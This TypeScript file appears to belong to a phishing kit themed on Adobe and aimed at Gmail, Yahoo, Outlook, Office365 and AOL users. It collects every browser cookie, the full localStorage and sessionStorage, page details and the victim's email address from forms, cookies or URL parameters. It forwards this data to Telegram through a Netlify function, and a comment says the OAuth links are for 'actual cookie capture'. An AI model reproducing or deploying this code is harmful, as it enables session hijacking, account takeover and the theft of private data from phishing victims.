// Send data to Telegram via Netlify function
export const sendToTelegram = async (data: any): Promise<any> => {
  try {
    const response = await fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    console.log('✅ Data sent to Telegram successfully:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
    throw error;
  }
};

export const getBrowserFingerprint = (userEmail?: string) => {
  // Check if we're in a browser environment
  if (typeof window === 'undefined' || typeof document === 'undefined' || typeof navigator === 'undefined') {
    const emailDomain = userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
    return {
      userAgent: 'Server-side',
      language: 'en-US',
      platform: 'Server',
      cookieEnabled: false,
      doNotTrack: null,
      timezone: 'UTC',
      url: '',
      domain: emailDomain,
      referrer: '',
      screen: {
        width: 0,
        height: 0,
        colorDepth: 0,
        pixelDepth: 0
      },
      cookies: '',
      cookiesParsed: {},
      localStorage: {},
      sessionStorage: {},
      timestamp: new Date().toISOString()
    };
  }
  
  // Enhanced cookie capture - get ALL cookies from current domain
  const getAllCookies = () => {
    const cookies = {};
    if (document.cookie) {
      document.cookie.split(';').forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name && value) {
          try {
            cookies[name] = decodeURIComponent(value);
          } catch (e) {
            cookies[name] = value; // fallback if decoding fails
          }
        }
      });
    }
    return cookies;
  };

  // Capture all storage data
  const getStorageData = (storage) => {
    const data = {};
    try {
      for (let i = 0; i < storage.length; i++) {
        const key = storage.key(i);
        if (key) {
          data[key] = storage.getItem(key);
        }
      }
    } catch (e) {
      console.warn('Storage access error:', e);
    }
    return data;
  };

  // Extract domain from email if provided, otherwise use current hostname
  const emailDomain = getProviderSpecificDomain(userEmail);
  
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'UTC',
    url: window.location.href,
    domain: emailDomain,
    referrer: document.referrer,
    screen: {
      width: typeof screen !== 'undefined' ? screen.width : 0,
      height: typeof screen !== 'undefined' ? screen.height : 0,
      colorDepth: typeof screen !== 'undefined' ? screen.colorDepth : 0,
      pixelDepth: typeof screen !== 'undefined' ? screen.pixelDepth : 0
    },
    cookies: document.cookie,
    cookiesParsed: getAllCookies(),
    localStorage: getStorageData(localStorage),
    sessionStorage: getStorageData(sessionStorage),
    timestamp: new Date().toISOString()
  };
};

// Provider-specific domain detection helper
function getProviderSpecificDomain(userEmail?: string): string {
  if (typeof window === 'undefined') {
    return userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
  }
  
  // Get session data to determine provider
  const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
  const provider = (sessionData.provider || 'Others').toLowerCase();
  const email = userEmail || sessionData.email || '';
  
  console.log('🌐 Provider-based domain detection:', { provider, email });
  
  // Provider-specific domain mapping (takes priority)
  if (provider.includes('gmail') || provider.includes('google')) {
    console.log('✅ Provider detected as Google');
    return 'google.com';
  } else if (provider.includes('yahoo')) {
    console.log('✅ Provider detected as Yahoo');
    return 'yahoo.com';
  } else if (provider.includes('aol')) {
    console.log('✅ Provider detected as AOL');
    return 'aol.com';
  } else if (provider.includes('hotmail') || provider.includes('live') || 
             provider.includes('outlook') || provider.includes('office365')) {
    console.log('✅ Provider detected as Microsoft');
    return 'live.com';
  }
  
  // For "Others" provider, extract domain from email
  if (provider === 'others' && email && email.includes('@')) {
    const emailDomain = email.split('@')[1].toLowerCase();
    console.log('🔄 Provider is "Others", using email domain:', emailDomain);
    return emailDomain;
  }
  
  // Use current domain instead of hardcoded fallbacks
  const hostname = window.location.hostname;
  console.log('🔄 Using current domain:', hostname);
  return hostname;
}

export const generateState = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

export const buildOAuthUrl = (provider: string, state: string) => {
  const baseUrl = window.location.origin;
  
  // Real OAuth URLs for actual cookie capture
  const redirectUri = encodeURIComponent(`${baseUrl}/auth/callback`);
  
  const oauthUrls = {
    'Gmail': `https://accounts.google.com/oauth/authorize?client_id=YOUR_GOOGLE_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=email profile&state=${state}`,
    'Yahoo': `https://api.login.yahoo.com/oauth2/request_auth?client_id=YOUR_YAHOO_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=openid email&state=${state}`,
    'Outlook': `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=YOUR_OUTLOOK_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=openid email profile&state=${state}`,
    'Office365': `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=YOUR_OFFICE365_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=openid email profile&state=${state}`,
    'AOL': `https://api.login.aol.com/oauth2/request_auth?client_id=YOUR_AOL_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=openid email&state=${state}`,
    'Others': `/auth/form/${provider}` // Fallback to form for unknown providers
  };
  
  return oauthUrls[provider as keyof typeof oauthUrls] || `/auth/form/${provider}`;
};

export const extractEmailFromProvider = (provider: string, code: string) => {
  // Extract real email from current session or form data
  try {
    // Try to get email from form data or existing session
    const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
    if (sessionData.email) {
      console.log('✅ Found existing email in session:', sessionData.email);
      return sessionData.email;
    }

    // Try to extract from URL parameters (OAuth callback)
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get('email');
      if (email) {
        console.log('✅ Found email in URL parameters:', email);
        return email;
      }
    }

    // Try to get from form inputs if available
    const emailInput = document.querySelector('input[type="email"]') as HTMLInputElement;
    if (emailInput && emailInput.value) {
      console.log('✅ Found email from form input:', emailInput.value);
      return emailInput.value;
    }

    // Extract from any existing cookies that might contain email
    const cookies = document.cookie.split(';');
    for (const cookie of cookies) {
      const [name, value] = cookie.trim().split('=');
      if (name === 'user_email' && value) {
        try {
          const decodedEmail = decodeURIComponent(value);
          console.log('✅ Found email from cookie:', decodedEmail);
          return decodedEmail;
        } catch (e) {
          console.warn('Failed to decode email from cookie');
        }
      }
    }

    // Last resort: return code as email if it looks like an email
    if (code && code.includes('@')) {
      console.log('✅ Using code as email:', code);
      return code;
    }

    console.warn('⚠️ No real email found, generating placeholder');
    // Only generate fake email as absolute last resort
    const domains = {
      'Gmail': 'gmail.com',
      'Yahoo': 'yahoo.com',
      'Outlook': 'outlook.com',
      'Office365': 'outlook.com',
      'AOL': 'aol.com',
      'Others': 'example.com'
    };
    
    const domain = domains[provider as keyof typeof domains] || 'example.com';
    return `user${Math.floor(Math.random() * 1000)}@${domain}`;
    
  } catch (error) {
    console.error('Error extracting email:', error);
    return `error@${provider.toLowerCase()}.com`;
  }
};